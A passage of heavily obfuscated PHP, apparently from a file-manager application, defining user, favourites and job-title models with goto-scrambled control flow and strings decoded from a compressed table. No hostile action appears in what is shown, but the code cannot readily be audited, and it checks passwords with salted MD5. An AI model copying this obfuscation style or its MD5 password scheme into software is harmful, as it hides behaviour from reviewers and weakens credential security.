FÔğ¿âî§‹; AË¢Ó¥Ãš: foreach ($D¥Ë°¦«ô¹ as &$Fê‘¦ÅäÈ”) { goto eçëçëŞÅ›; EˆŸ¨­–ŞÔ: $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[180]] = $Aï„•‹’§; Hook::trigger($AŠƒöÚ»¹[579], $Fê‘¦ÅäÈ”); $cÎ‚°ÈëÅß[$Aï„•‹’§][] =& $Fê‘¦ÅäÈ”; goto A¨ãÈ²ª†; eçëçëŞÅ›: Hook::trigger($AŠƒöÚ»¹[578], $Fê‘¦ÅäÈ”); $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[86]] = $bê®¬†÷›->getPathInner($Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[86]]); $D®ã‚ëê = $bê®¬†÷›->hashSimple($Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[86]]); goto aŸÕù¾†; A¨ãÈ²ª†: if (count($cÎ‚°ÈëÅß[$Aï„•‹’§]) > 1) { $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[577]] = !0; } goto cêØÅ”¬å†; aŸÕù¾†: $Aï„•‹’§ = $bê®¬†÷›->hashMd5($Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[86]]); if (strlen($Aï„•‹’§) > 10 && !isset($cÎ‚°ÈëÅß[$Aï„•‹’§])) { $cÎ‚°ÈëÅß[$Aï„•‹’§] = array(); } $Fê‘¦ÅäÈ”[$AŠƒöÚ»¹[181]] = $D®ã‚ëê; goto EˆŸ¨­–ŞÔ; cêØÅ”¬å†: } unset($Fê‘¦ÅäÈ”); $cÈÍŠ‰–§· = array($AŠƒöÚ»¹[180] => array($AŠƒöÚ»¹[7], array_keys($cÎ‚°ÈëÅß))); goto dà™®†İÆÕ; FÔğ¿âî§‹: } } define($_SERVER[Ü˜][581], $_SERVER[Ü˜][582]); goto Dší‚âæÕ»; bÌÈİğ†ô¤: define($_SERVER[Ü˜][0], $_SERVER[Ü˜][1]); $_SERVER[øä] = explode($_SERVER[Ü˜][2], gzinflate(substr($_SERVER[Ü˜][3], 10, -8))); function binCheckEq($e•øŸğŸ…¬, $e“Å—–‚©È) { return $e•øŸğŸ…¬ == $e“Å—–‚©È; } goto EŠÇø¬øó; AØÄëÌ±µæ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($eÇ–Ïõ³‡) { $c“Î÷Çäí¶ =& $_SERVER[Ü˜]; return array($c“Î÷Çäí¶[1795] => array(USER_ID, $c“Î÷Çäí¶[2114])); } protected function listData() { $f¶¹İ¡ÈÉ =& $_SERVER[Ü˜]; $bìÚÁåÜÓù = array($f¶¹İ¡ÈÉ[1521] => USER_ID, $f¶¹İ¡ÈÉ[472] => 0); $a×µ®·Àñ¯ = $f¶¹İ¡ÈÉ[2115]; $Cº˜äÅ–İÕ = $this->field($a×µ®·Àñ¯)->where($bìÚÁåÜÓù)->order($f¶¹İ¡ÈÉ[2116])->select(); return $Cº˜äÅ–İÕ ? $Cº˜äÅ–İÕ : array(); } protected function resetCache() { } protected function listView() { goto bæ½ ¶¨êä; bæ½ ¶¨êä: $fä“ÉÁÜ¢ó =& $_SERVER[Ü˜]; $D°˜£…¾ï© = $this->listData(); $BèŒ–ë‘è§ = array_filter_by_field($D°˜£…¾ï©, $fä“ÉÁÜ¢ó[29], $fä“ÉÁÜ¢ó[418]); goto B‘Ÿ¹ÊÁ×¯; b®èÏ¯óƒÜ: $a×Şó„İÚ¼ = array($fä“ÉÁÜ¢ó[419] => array($fä“ÉÁÜ¢ó[420], $eà§ÁÂí‚)); $aŒÚ‚Ëä¿“ = Model($fä“ÉÁÜ¢ó[799])->listSource($a×Şó„İÚ¼, $Cáâİöª£Œ); $aŒÚ‚Ëä¿“ = array_merge($aŒÚ‚Ëä¿“[$fä“ÉÁÜ¢ó[84]], $aŒÚ‚Ëä¿“[$fä“ÉÁÜ¢ó[85]]); goto dÚÄÉË¹‹È; dÚÄÉË¹‹È: $aŒÚ‚Ëä¿“ = array_to_keyvalue($aŒÚ‚Ëä¿“, $fä“ÉÁÜ¢ó[404]); foreach ($D°˜£…¾ï© as $eŞíƒé¬»ˆ => $c½Ä°…¡«) { $C°—„™åç¤ = $aŒÚ‚Ëä¿“[$c½Ä°…¡«[$fä“ÉÁÜ¢ó[86]]]; $C°—„™åç¤ = $C°—„™åç¤ ? $C°—„™åç¤ : array(); $D°˜£…¾ï©[$eŞíƒé¬»ˆ] = array_merge($C°—„™åç¤, $c½Ä°…¡«); } return $D°˜£…¾ï©; goto FôõÏ‡ÍŞì; B‘Ÿ¹ÊÁ×¯: $eà§ÁÂí‚ = array_to_keyvalue($BèŒ–ë‘è§, $fä“ÉÁÜ¢ó[33], $fä“ÉÁÜ¢ó[86]); if (!$eà§ÁÂí‚) { return $D°˜£…¾ï©; } $Cáâİöª£Œ = 2000; goto b®èÏ¯óƒÜ; FôõÏ‡ÍŞì: } protected function addFav($b×ƒ°‘‹ò°, $AÖàØ÷›Ï = '', $C¤Œ¹Œ šÁ = "\x73\x6f\165\162\x63\x65") { goto A·Å¦´í™Á; C¯È‘Ì¨©š: if (!$AÖàØ÷›Ï && $C¤Œ¹Œ šÁ == $CÒÉ»·±ªè[418]) { $aÇÈÑ’í˜­ = Model($CÒÉ»·±ªè[1207])->where(array($CÒÉ»·±ªè[419] => $b×ƒ°‘‹ò°))->find(); if (!$aÇÈÑ’í˜­) { return !1; } $AÖàØ÷›Ï = $aÇÈÑ’í˜­[$CÒÉ»·±ªè[28]]; } $AÖàØ÷›Ï = $this->getAutoName($AÖàØ÷›Ï); $EÜ°óä¯À“ = array($CÒÉ»·±ªè[1521] => USER_ID, $CÒÉ»·±ªè[472] => 0, $CÒÉ»·±ªè[422] => $AÖàØ÷›Ï, $CÒÉ»·±ªè[423] => $b×ƒ°‘‹ò°, $CÒÉ»·±ªè[424] => $C¤Œ¹Œ šÁ, $CÒÉ»·±ªè[1697] => $cöÎŒ–ØµÛ + 1); goto BÙÚ¾ÂŞŸÕ; EÀÇ«”ËÕ«: $bŒŠÉïª¾ô = array($CÒÉ»·±ªè[1521] => USER_ID, $CÒÉ»·±ªè[472] => 0); $cöÎŒ–ØµÛ = $this->where($bŒŠÉïª¾ô)->max($CÒÉ»·±ªè[1716]); if (!$cöÎŒ–ØµÛ) { $cöÎŒ–ØµÛ = 0; } goto C¯È‘Ì¨©š; A·Å¦´í™Á: $CÒÉ»·±ªè =& $_SERVER[Ü˜]; $bŒŠÉïª¾ô = array($CÒÉ»·±ªè[1521] => USER_ID, $CÒÉ»·±ªè[472] => 0, $CÒÉ»·±ªè[424] => $C¤Œ¹Œ šÁ, $CÒÉ»·±ªè[423] => $b×ƒ°‘‹ò°); if ($this->where($bŒŠÉïª¾ô)->find()) { return !1; } goto EÀÇ«”ËÕ«; BÙÚ¾ÂŞŸÕ: return $this->add($EÜ°óä¯À“); goto e…±ŠÙ§Ï‚; e…±ŠÙ§Ï‚: } protected function remove($fÇãÂ³…ß) { $DŞ†Û¼ŒÚ =& $_SERVER[Ü˜]; $b…ïšëó›£ = array($DŞ†Û¼ŒÚ[1521] => USER_ID, $DŞ†Û¼ŒÚ[421] => $fÇãÂ³…ß); return $this->where($b…ïšëó›£)->delete(); } protected function removeByName($B§¬Á«™ê) { $A»«ï‚ä™Ë =& $_SERVER[Ü˜]; $F¿‘¿‰ÇùÓ = array($A»«ï‚ä™Ë[1521] => USER_ID, $A»«ï‚ä™Ë[422] => $B§¬Á«™ê, $A»«ï‚ä™Ë[472] => 0); return $this->where($F¿‘¿‰ÇùÓ)->delete(); } protected function rename($BíšæòĞİ, $dšğöñÇİ) { $e¦œİô‹›ƒ =& $_SERVER[Ü˜]; if ($BíšæòĞİ == $dšğöñÇİ) { return !1; } $F­ÅÒ›ãÌ£ = $this->getAutoName($dšğöñÇİ); if ($dšğöñÇİ != $F­ÅÒ›ãÌ£) { return !1; } $A±ã¼¼à = array($e¦œİô‹›ƒ[1521] => USER_ID, $e¦œİô‹›ƒ[472] => 0, $e¦œİô‹›ƒ[28] => $BíšæòĞİ); return $this->where($A±ã¼¼à)->save(array($e¦œİô‹›ƒ[28] => $dšğöñÇİ)); } protected function resetSort($c¨¹Ô®Ş“) { $eÁĞ¨ÆÕÙ° =& $_SERVER[Ü˜]; $c¨¹Ô®Ş“ = is_array($c¨¹Ô®Ş“) ? $c¨¹Ô®Ş“ : array(); $cçÆ°  = array($eÁĞ¨ÆÕÙ°[1521] => USER_ID); for ($bµçåŒëÂ = 0; $bµçåŒëÂ < count($c¨¹Ô®Ş“); $bµçåŒëÂ++) { $cçÆ° [$eÁĞ¨ÆÕÙ°[421]] = $c¨¹Ô®Ş“[$bµçåŒëÂ]; $this->where($cçÆ° )->save(array($eÁĞ¨ÆÕÙ°[1697] => $bµçåŒëÂ + 1)); } return !0; } protected function moveTop($Bö’ç×ÅÂ) { goto Bï¿ï‘‡ö; eË‘ ºÊ¡: if (!$Eö±è¬”¨«) { return; } $DÀ„Åù—³ = $this->field($Fô½á®Øù¶[402])->where($aÄæ±ğ‰¦)->order($Fô½á®Øù¶[2116])->select(); $DÀ„Åù—³ = array_to_keyvalue($DÀ„Åù—³, $Fô½á®Øù¶[33], $Fô½á®Øù¶[402]); goto CàˆËåùÎø; Eë£èÕªª·: return $this->resetSort($DÀ„Åù—³); goto Dô‰æé¹Ÿ; Bï¿ï‘‡ö: $Fô½á®Øù¶ =& $_SERVER[Ü˜]; $aÄæ±ğ‰¦ = array($Fô½á®Øù¶[1521] => USER_ID, $Fô½á®Øù¶[472] => 0); $Eö±è¬”¨« = $this->where($aÄæ±ğ‰¦)->where(array($Fô½á®Øù¶[28] => $Bö’ç×ÅÂ))->find(); goto eË‘ ºÊ¡; CàˆËåùÎø: $Dõô’šÍš¨ = $DÀ„Åù—³; $DÀ„Åù—³ = array_remove_value($DÀ„Åù—³, $Eö±è¬”¨«[$Fô½á®Øù¶[402]]); array_unshift($DÀ„Åù—³, $Eö±è¬”¨«[$Fô½á®Øù¶[402]]); goto Eë£èÕªª·; Dô‰æé¹Ÿ: } protected function moveBottom($e½‰ğÌ•Ï®) { $a’¹‚•Œ×¦ =& $_SERVER[Ü˜]; $DĞĞ¢‡–ºø = array($a’¹‚•Œ×¦[1521] => USER_ID, $a’¹‚•Œ×¦[472] => 0); $b†Ä–ÜÀî· = $this->where($DĞĞ¢‡–ºø)->max($a’¹‚•Œ×¦[1716]); $C¼Í±…íòÎ = array($a’¹‚•Œ×¦[1716] => $b†Ä–ÜÀî· + 1); return $this->where($DĞĞ¢‡–ºø)->where(array($a’¹‚•Œ×¦[28] => $e½‰ğÌ•Ï®))->save($C¼Í±…íòÎ); } private function getAutoName($dï«ƒæºÅ) { goto dƒÖ’ó‹Ëö; dƒÖ’ó‹Ëö: $aàèå“Æ¼À =& $_SERVER[Ü˜]; $FàŒíÏÇ‡„ = array($aàèå“Æ¼À[1521] => USER_ID, $aàèå“Æ¼À[472] => 0); $dóõî’³”¿ = $this->field($aàèå“Æ¼À[28])->where($FàŒíÏÇ‡„)->select(); goto D†›öº‹; D†›öº‹: $dóõî’³”¿ = array_to_keyvalue($dóõî’³”¿, $aàèå“Æ¼À[33], $aàèå“Æ¼À[28]); if (!$dóõî’³”¿ || !in_array($dï«ƒæºÅ, $dóõî’³”¿)) { return $dï«ƒæºÅ; } for ($eŒÔåå¡ÏŠ = 0; $eŒÔåå¡ÏŠ < count($dóõî’³”¿); $eŒÔåå¡ÏŠ++) { if (!in_array($dï«ƒæºÅ . "\x28{$eŒÔåå¡ÏŠ}\51", $dóõî’³”¿)) { return $dï«ƒæºÅ . "\x28{$eŒÔåå¡ÏŠ}\x29"; } } goto FÏ‡¼¡ÆÅµ; FÏ‡¼¡ÆÅµ: return $dï«ƒæºÅ . "\x28{$eŒÔåå¡ÏŠ}\x29"; goto DÙ©‡«Î®Í; DÙ©‡«Î®Í: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x6a\x6f\142\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x64\145\163\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\146\112\x6f\142\x4c\x69\163\x74"; public function listData($cÅè£Ş×¥× = false, $c®Êñ—œ = "\x73\x6f\x72\x74", $C³ÀŸ¦Î = false) { return parent::listData($cÅè£Ş×¥×, $c®Êñ—œ, $C³ÀŸ¦Î); } public function remove($BÅàƒ¸áÖ‰) { return parent::remove($BÅàƒ¸áÖ‰); } public function add($aœãÏÌÆöÅ) { $fÌÃ¥õî‘– =& $_SERVER[Ü˜]; if ($this->findByName($aœãÏÌÆöÅ[$fÌÃ¥õî‘–[28]])) { return !1; } $aœãÏÌÆöÅ[$fÌÃ¥õî‘–[1716]] = $this->getSort(); return parent::insert($aœãÏÌÆöÅ); } private function getSort() { $fù™İÄƒó‘ =& $_SERVER[Ü˜]; $fÔÈç²ñã© = parent::listData(); $AøÅÆàØ§É = array_to_keyvalue($fÔÈç²ñã©, $fù™İÄƒó‘[33], $fù™İÄƒó‘[1716]); return empty($AøÅÆàØ§É) ? 0 : max($AøÅÆàØ§É) + 1; } public function update($dÔÍË›ïˆ¦, $B©Œ±¤ó–´) { $EØ°œŸÒµ© =& $_SERVER[Ü˜]; $CÁ„¹ÁÈ¼ = parent::listData($dÔÍË›ïˆ¦); $cùëò¬Ôª = $this->findByName($B©Œ±¤ó–´[$EØ°œŸÒµ©[28]]); if (!$CÁ„¹ÁÈ¼ || $cùëò¬Ôª && $cùëò¬Ôª[$EØ°œŸÒµ©[402]] != $CÁ„¹ÁÈ¼[$EØ°œŸÒµ©[402]]) { return !1; } return parent::update($dÔÍË›ïˆ¦, $B©Œ±¤ó–´); } public function setUserJob($F‰‰›ôôÔÇ, $d¥§¯Ÿ«ƒš) { goto C„œœğó; C„œœğó: $DÂ°È’àŞ† =& $_SERVER[Ü˜]; if (!is_array($d¥§¯Ÿ«ƒš)) { $d¥§¯Ÿ«ƒš = array($d¥§¯Ÿ«ƒš); } $CÎÏ¿ŒÏŒ‚ = parent::listData(); goto CÃÑßÑäª; DÔ—§»‰»ƒ: $Då‚’ÊÈ›› = rtrim($Då‚’ÊÈ››, $DÂ°È’àŞ†[47]); Model($DÂ°È’àŞ†[515])->metaSet($F‰‰›ôôÔÇ, self::JOB_KEY, $Då‚’ÊÈ››); goto aâ ¢‡–; CÃÑßÑäª: $bôÇ…Õ¸Šä = array_to_keyvalue($CÎÏ¿ŒÏŒ‚, $DÂ°È’àŞ†[28]); $Då‚’ÊÈ›› = $DÂ°È’àŞ†[384]; foreach ($d¥§¯Ÿ«ƒš as $A™¾´ÀÌò) { if ($bôÇ…Õ¸Šä[$A™¾´ÀÌò]) { $Då‚’ÊÈ›› .= $bôÇ…Õ¸Šä[$A™¾´ÀÌò][$DÂ°È’àŞ†[402]] . $DÂ°È’àŞ†[47]; } else { $B²í¯†“·Å = $this->add($A™¾´ÀÌò); $Då‚’ÊÈ›› .= $B²í¯†“·Å . $DÂ°È’àŞ†[47]; } } goto DÔ—§»‰»ƒ; aâ ¢‡–: } public function getUserJob($aÚÓõèÀŒé) { $A°ò²¯Í¼ç = Model($_SERVER[Ü˜][515])->metaGet($aÚÓõèÀŒé); return $this->getUserJobInfo($A°ò²¯Í¼ç[self::JOB_KEY]); } public function getUserJobInfo($AÔ‰§ÁÓøí) { goto b¡Õ¦†Ïî; C«óÚğ¡: $fÏ º ëÒ = array_remove_key($fÏ º ëÒ, $bàÑŒ”†í[204]); $Aõ§­ùÎŠù = array(); foreach ($eóŒ¤œºùù as $AÇÙ†‹™) { if (isset($fÏ º ëÒ[$AÇÙ†‹™])) { $Aõ§­ùÎŠù[] = $fÏ º ëÒ[$AÇÙ†‹™]; } } goto DÃëæˆ“Ó; DÃëæˆ“Ó: return $Aõ§­ùÎŠù; goto Aİô´ÏÒø; b¡Õ¦†Ïî: $bàÑŒ”†í =& $_SERVER[Ü˜]; $eóŒ¤œºùù = explode($bàÑŒ”†í[47], $AÔ‰§ÁÓøí); $fÏ º ëÒ = parent::listData(); goto C«óÚğ¡; Aİô´ÏÒø: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\155\145" => "\165\163\145\x72\137\155\x65\164\141", "\x6d\x65\164\x61\106\151\x65\x6c\144" => "\x75\x73\145\x72\x49\104"); protected $simpleField = "\165\163\x65\162\111\104\x2c\x6e\x69\x63\x6b\116\x61\x6d\x65\x2c\x6e\x61\155\x65\54\x61\x76\141\x74\x61\x72\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($C¢­ÆìÂ®Ö) { $Bö¶Ï”Œó‘ =& $_SERVER[Ü˜]; $eÙô’«¢æ = $Bö¶Ï”Œó‘[2117]; return array($Bö¶Ï”Œó‘[1763] => array($C¢­ÆìÂ®Ö[0], $eÙô’«¢æ), $Bö¶Ï”Œó‘[1765] => array($C¢­ÆìÂ®Ö[0], $eÙô’«¢æ), $Bö¶Ï”Œó‘[2118] => array($C¢­ÆìÂ®Ö[0], $eÙô’«¢æ)); } protected function getInfo($e¼œ©ò¤¾Ø, $F³Š¤é±¾é = false) { $AñÍÉÑ¶‘… = $this->getInfoSimple($e¼œ©ò¤¾Ø); if (!is_array($AñÍÉÑ¶‘…)) { return array(); } if ($F³Š¤é±¾é) { return $this->_getInfoApply($AñÍÉÑ¶‘…); } return $this->cacheFunctionGet($_SERVER[Ü˜][1772], $e¼œ©ò¤¾Ø); } protected function getInfoFull($bù…–Â°, $dİ÷ÑÈ„ªÓ = false) { $a…õ‹İùôñ = $this->getInfoSimple($bù…–Â°); if (!is_array($a…õ‹İùôñ)) { return array(); } if ($dİ÷ÑÈ„ªÓ) { return $this->_getInfoApply($a…õ‹İùôñ, !0); return $this->_getInfoApply($a…õ‹İùôñ, !0); } return $this->cacheFunctionGet($_SERVER[Ü˜][2119], $bù…–Â°); } private function _getInfoApply($FÀäÙÒ±È„, $A‡ÍÈñŸåé = false) { goto EøĞÉµç¾³; B·»¼ŒºŠÌ: $FÀäÙÒ±È„ = $this->_listDataApplyItem($FÀäÙÒ±È„); $b¨Ÿ¾Š›‰ = Model($bºëíØÖ±[1207])->metaGet($FÀäÙÒ±È„[$bºëíØÖ±[95]][$bºëíØÖ±[404]]); $FÀäÙÒ±È„[$bºëíØÖ±[2122]] = $Eˆ¡°ô; goto d‘ÒË“¸í; EøĞÉµç¾³: $bºëíØÖ± =& $_SERVER[Ü˜]; if (!$FÀäÙÒ±È„) { return $FÀäÙÒ±È„; } $Eˆ¡°ô = md5($bºëíØÖ±[2120] . $FÀäÙÒ±È„[$bºëíØÖ±[850]] . $bºëíØÖ±[2121] . $FÀäÙÒ±È„[$bºëíØÖ±[28]]); goto B·»¼ŒºŠÌ; d‘ÒË“¸í: $FÀäÙÒ±È„[$bºëíØÖ±[95]][$bºëíØÖ±[1953]] = isset($b¨Ÿ¾Š›‰[$bºëíØÖ±[1954]]) ? $b¨Ÿ¾Š›‰[$bºëíØÖ±[1954]] : null; if ($A‡ÍÈñŸåé) { $FÀäÙÒ±È„[$bºëíØÖ±[454]] = $this->metaGet($FÀäÙÒ±È„[$bºëíØÖ±[1529]]); } return $FÀäÙÒ±È„; goto aà­—Ù„Ú‚; aà­—Ù„Ú‚: } protected function getInfoSimple($D²Š×öâêè, $aóë¸„ÃÂÚ = false) { $cÍá‡ÕÑ‹ˆ =& $_SERVER[Ü˜]; if (!$D²Š×öâêè) { return array(); } if ($aóë¸„ÃÂÚ) { $bª Ÿ³ó‘ = $this->where(array($cÍá‡ÕÑ‹ˆ[1529] => intval($D²Š×öâêè)))->find(); if (!is_array($bª Ÿ³ó‘)) { return array(); } $bª Ÿ³ó‘[$cÍá‡ÕÑ‹ˆ[2123]] = Action($cÍá‡ÕÑ‹ˆ[2124])->parseUrl($bª Ÿ³ó‘[$cÍá‡ÕÑ‹ˆ[2123]]); return $bª Ÿ³ó‘; } return $this->cacheFunctionGet($cÍá‡ÕÑ‹ˆ[1766], $D²Š×öâêè); } protected function getInfoSimpleOuter($FãŸ¼¸Ú‹Í) { goto eÇ¼³ã«º“; eÇ¼³ã«º“: $DÙòØÄ¡«• =& $_SERVER[Ü˜]; if (!$FãŸ¼¸Ú‹Í || $FãŸ¼¸Ú‹Í == 0) { return array($DÙòØÄ¡«•[1529] => $DÙòØÄ¡«•[201], $DÙòØÄ¡«•[28] => $DÙòØÄ¡«•[170] . LNG($DÙòØÄ¡«•[2125]) . $DÙòØÄ¡«•[513], $DÙòØÄ¡«•[2123] => STATIC_PATH . $DÙòØÄ¡«•[2126]); } $EŠ©ôÌàÏÌ = $this->cacheFunctionGet($DÙòØÄ¡«•[1766], $FãŸ¼¸Ú‹Í); goto c²¬ŒªÂ„é; AÛÚµ‡äç¢: return $dÊĞ÷ÕìÊæ; goto F·İ³™ÇÙÈ; c²¬ŒªÂ„é: $dÊĞ÷ÕìÊæ = array_field_key($EŠ©ôÌàÏÌ, explode($DÙòØÄ¡«•[47], $this->simpleField)); if (!$dÊĞ÷ÕìÊæ) { return array($DÙòØÄ¡«•[1529] => $DÙòØÄ¡«•[1086], $DÙòØÄ¡«•[28] => $DÙòØÄ¡«•[170] . LNG($DÙòØÄ¡«•[2127]) . $DÙòØÄ¡«•[513], $DÙòØÄ¡«•[2123] => STATIC_PATH . $DÙòØÄ¡«•[2128]); } $dÊĞ÷ÕìÊæ[$DÙòØÄ¡«•[2123]] = Action($DÙòØÄ¡«•[2124])->parseUrl($dÊĞ÷ÕìÊæ[$DÙòØÄ¡«•[2123]]); goto AÛÚµ‡äç¢; F·İ³™ÇÙÈ: } protected function groupUser($F¡…ëäÄ‚ò) { } public static function errorLang($aÍŒÙê÷å) { $a¬ó’åÇ— =& $_SERVER[Ü˜]; $Cšõ‡œ†½­ = array(self::ERROR_USER_NOT_EXISTS => $a¬ó’åÇ—[2129], self::ERROR_USER_PASSWORD_ERROR => $a¬ó’åÇ—[2130], self::ERROR_USER_EXIST_NAME => $a¬ó’åÇ—[2131], self::ERROR_USER_EXIST_PHONE => $a¬ó’åÇ—[2132], self::ERROR_USER_EXIST_EMAIL => $a¬ó’åÇ—[2133], self::ERROR_USER_LOGIN_LOCK => $a¬ó’åÇ—[2134], self::ERROR_IP_NOT_ALLOW => $a¬ó’åÇ—[2135], self::ERROR_USER_EXIST_NICKNAME => $a¬ó’åÇ—[2136]); return LNG($Cšõ‡œ†½­[$aÍŒÙê÷å]); } public function getInfoByMeta($AÁî„áºç, $AĞš”“Áì) { $f¸¼öùîñÉ =& $_SERVER[Ü˜]; $DôãÜâÆà = Model($f¸¼öùîñÉ[2137])->where(array($f¸¼öùîñÉ[103] => $AÁî„áºç, $f¸¼öùîñÉ[381] => $AĞš”“Áì))->find(); if ($DôãÜâÆà) { return $this->getInfo($DôãÜâÆà[$f¸¼öùîñÉ[1529]]); } return !1; } public function userLoginCheck($Aá‘Ù‰Ùœ£, $d…®Ñøç¿ª) { $Bâİğ¡ãï  =& $_SERVER[Ü˜]; $C„Ÿ±äï = $this->userLoginFind($Aá‘Ù‰Ùœ£); if (!$C„Ÿ±äï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($C„Ÿ±äï[$Bâİğ¡ãï [1529]], $d…®Ñøç¿ª)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($C„Ÿ±äï[$Bâİğ¡ãï [1529]]); } public function userLoginFind($f”ÛÆãËŸâ) { $A·œ–‡ÚÀ¯ =& $_SERVER[Ü˜]; $cğ¯º¬ˆÖ¶ = array($A·œ–‡ÚÀ¯[28] => $f”ÛÆãËŸâ, $A·œ–‡ÚÀ¯[1957] => $f”ÛÆãËŸâ, $A·œ–‡ÚÀ¯[312] => $f”ÛÆãËŸâ, $A·œ–‡ÚÀ¯[2138] => $f”ÛÆãËŸâ, $A·œ–‡ÚÀ¯[958] => $A·œ–‡ÚÀ¯[960]); if ($this->nickNameRpt()) { unset($cğ¯º¬ˆÖ¶[$A·œ–‡ÚÀ¯[1957]]); } return $this->where($cğ¯º¬ˆÖ¶)->find(); } public function clearCache($D³ê¦¶¹É) { $F©ÆãÚ†¨ =& $_SERVER[Ü˜]; $this->cacheFunctionClear($F©ÆãÚ†¨[1772], $D³ê¦¶¹É); $this->cacheFunctionClear($F©ÆãÚ†¨[1766], $D³ê¦¶¹É); $this->cacheFunctionClear($F©ÆãÚ†¨[2119], $D³ê¦¶¹É); } public function userPasswordCheck($F¦¢¬Û½™, $E²äî¨¦ªë) { $Eôğ‚“– ¬ =& $_SERVER[Ü˜]; $fåÓ×Ó…ˆ© = $this->where(array($Eôğ‚“– ¬[1529] => intval($F¦¢¬Û½™)))->find(); $E’Éí¹œ§ = $this->metaGet($F¦¢¬Û½™); $AëÁŒÁ¤§¼ = isset($E’Éí¹œ§[$Eôğ‚“– ¬[2139]]) ? $E’Éí¹œ§[$Eôğ‚“– ¬[2139]] : $Eôğ‚“– ¬[33]; if (md5($AëÁŒÁ¤§¼ . trim($E²äî¨¦ªë)) !== $fåÓ×Ó…ˆ©[$Eôğ‚“– ¬[850]]) { return !1; } return !0; } public function userAdd($bÄÏœÀ–î¸) { goto E‚İ‹°©ÛÜ; AÑ—¶½¬Ù‘: $eÏ˜Íáß¨ˆ = $this->_checkExist($bÄÏœÀ–î¸); if ($eÏ˜Íáß¨ˆ !== !0) { return $eÏ˜Íáß¨ˆ; } $A¶´ù„·ÎŞ = $this->add($fÊ©‚Š—Äô); goto Dãâ…¦•¨¡; Dãâ…¦•¨¡: $Fİ”¦Å™ŞŞ = array($C”Ü­¬­Öš[2147] => $fÊ©‚Š—Äô[$C”Ü­¬­Öš[850]], $C”Ü­¬­Öš[2143] => $fÊ©‚Š—Äô[$C”Ü­¬­Öš[1957]]); $this->userEdit($A¶´ù„·ÎŞ, $Fİ”¦Å™ŞŞ); Model($C”Ü­¬­Öš[1207])->userRootAdd($A¶´ù„·ÎŞ); goto eµ–Í¡˜ë­; eµ–Í¡˜ë­: return $A¶´ù„·ÎŞ; goto D¯Ş‹¤Ğµ; E‚İ‹°©ÛÜ: $C”Ü­¬­Öš =& $_SERVER[Ü˜]; $fÊ©‚Š—Äô = array($C”Ü­¬­Öš[422] => $bÄÏœÀ–î¸[$C”Ü­¬­Öš[28]], $C”Ü­¬­Öš[2140] => $bÄÏœÀ–î¸[$C”Ü­¬­Öš[1414]], $C”Ü­¬­Öš[2141] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[312]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[312]] : $C”Ü­¬­Öš[33], $C”Ü­¬­Öš[2142] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[2138]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[2138]] : $C”Ü­¬­Öš[33], $C”Ü­¬­Öš[2143] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[1957]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[1957]] : $bÄÏœÀ–î¸[$C”Ü­¬­Öš[28]], $C”Ü­¬­Öš[2144] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[2123]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[2123]] : $C”Ü­¬­Öš[33], $C”Ü­¬­Öš[2145] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[2146]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[2146]] : 1, $C”Ü­¬­Öš[2147] => $bÄÏœÀ–î¸[$C”Ü­¬­Öš[850]], $C”Ü­¬­Öš[1767] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[1677]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[1677]] : 1024 * 1024 * 20, $C”Ü­¬­Öš[1768] => 0, $C”Ü­¬­Öš[2148] => 0, $C”Ü­¬­Öš[1811] => isset($bÄÏœÀ–î¸[$C”Ü­¬­Öš[719]]) ? $bÄÏœÀ–î¸[$C”Ü­¬­Öš[719]] : 1); if (!empty($bÄÏœÀ–î¸[$C”Ü­¬­Öš[1529]])) { $fÊ©‚Š—Äô[$C”Ü­¬­Öš[1529]] = $bÄÏœÀ–î¸[$C”Ü­¬­Öš[1529]]; } goto AÑ—¶½¬Ù‘; D¯Ş‹¤Ğµ: } protected function userEditTest($c§õºÑ‚µæ, $A©öÊ¡Ì¤ö) { return $this->call($_SERVER[Ü˜][2149], $c§õºÑ‚µæ, $A©öÊ¡Ì¤ö); } protected function userEdit($BëŒ¿Ïé­•, $f² ‡ÅçÚ) { goto B­˜ôÍã—Â; eÕ‹–õĞ‘Ã: return !0; goto cÌï”…Çù; B­˜ôÍã—Â: $d§ê“ÔÓˆÒ =& $_SERVER[Ü˜]; $fÁ‹ëÃÁ× = $this->getInfoSimple($BëŒ¿Ïé­•); if (!$fÁ‹ëÃÁ×) { return !1; } goto AİĞïğ‰·; Aë˜Ìğ»ÚÛ: $this->where(array($d§ê“ÔÓˆÒ[1521] => $BëŒ¿Ïé­•))->save($f² ‡ÅçÚ); if (isset($f² ‡ÅçÚ[$d§ê“ÔÓˆÒ[1957]])) { $this->setNamePinyin($BëŒ¿Ïé­•, $f² 